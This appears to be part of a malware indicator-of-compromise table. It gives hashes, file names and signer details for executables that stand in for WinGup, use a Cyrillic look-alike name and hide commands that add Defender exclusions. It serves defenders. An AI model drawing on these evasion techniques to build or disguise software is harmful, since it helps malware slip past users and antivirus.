| Signed Go executable | SHA-256 | 73d2241ed1708b7431ba4164d8a5a1760add104d5061f934a76953524e4fd934 | Go 1.19.11 x64 GUI executable, 9,554,320 B, signer `CN=Sterling Signal`; `Setup.exe` in `mpclient.zip` with SHA-256 of file 9ef19ea806ddb6d641469e600f4ea63361f2d7b9b893403be1971cfb71b9ab5c; shipped in place of WinGup beside the loader with SHA-256 of file 2ffa9d2ac0f1d4ccd62c5cea4273802b2de428c47fc7d051822670203af4e86d; self-signed (`C=US`, O equal to CN), DigiCert timestamp |
| Executable | SHA-256 | 080840610f3cea9063c115ae0eda906fef08b4a8883f19e9737bdeb1d08bbebb | `Lоаdеr.exe` (Cyrillic letters), 4,172,216 B, shipped in place of WinGup beside the loader with SHA-256 of file 026f91061f2bda281f11e46d38a07ee181ff4c38a41a2858056cfc66933e2ecd in `Kapu.rar` with SHA-256 of file d3fa3b9aacdf3224b0ab64de4fe86b5eafffaa097dc4535f152782b1a9306a0a |
| Executable | SHA-256 | 4a800b9da8b0bca037b8896a5b44bd3da41e4cb7184ef15da5c995c5c31b03ae | `Xeno-v1.3.60.exe` beside the loader `Xeno.dll` with SHA-256 of file d52f40f67256905d5f1ba20be94aba2048a50e4527f379783ca3b660da4a70c5 in `Xeno-v1.3.60.rar`; version information names `SmallDrop`; holds hidden PowerShell commands that add Defender exclusions |
